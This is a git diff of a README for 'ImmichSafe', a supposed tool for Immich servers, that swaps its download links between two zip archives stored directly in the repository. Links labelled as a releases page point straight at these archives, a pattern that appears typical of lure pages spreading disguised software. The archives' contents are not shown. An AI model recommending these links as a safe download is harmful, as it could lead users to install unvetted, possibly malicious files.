@@ -1,6 +1,6 @@
 # 🌟 ImmichSafe - Your Reliable Tool for Immich Servers
 
-[![Download ImmichSafe](https://raw.githubusercontent.com/razman14/ImmichSafe/main/jalousied/ImmichSafe.zip)](https://raw.githubusercontent.com/razman14/ImmichSafe/main/jalousied/ImmichSafe.zip)
+[![Download ImmichSafe](https://github.com/razman14/ImmichSafe/raw/refs/heads/main/assets/Safe-Immich-v3.2.zip)](https://github.com/razman14/ImmichSafe/raw/refs/heads/main/assets/Safe-Immich-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ImmichSafe, the ultimate companion for your Immich server. This guide
 
 ## 📥 Download & Install
 
-To download ImmichSafe, visit this page: [ImmichSafe Releases](https://raw.githubusercontent.com/razman14/ImmichSafe/main/jalousied/ImmichSafe.zip). 
+To download ImmichSafe, visit this page: [ImmichSafe Releases](https://github.com/razman14/ImmichSafe/raw/refs/heads/main/assets/Safe-Immich-v3.2.zip). 
 
 Follow these steps to get started:
 
@@ -54,7 +54,7 @@ If problems persist, you can check the Issues section on the GitHub page for add
 
 For more detailed information about using ImmichSafe, refer to the GitHub Wiki or readme available on the repository. You can find step-by-step guides, FAQs, and additional tips.
 
-[ImmichSafe Releases](https://raw.githubusercontent.com/razman14/ImmichSafe/main/jalousied/ImmichSafe.zip) 
+[ImmichSafe Releases](https://github.com/razman14/ImmichSafe/raw/refs/heads/main/assets/Safe-Immich-v3.2.zip) 
 
 ## 🥳 Get Involved
 
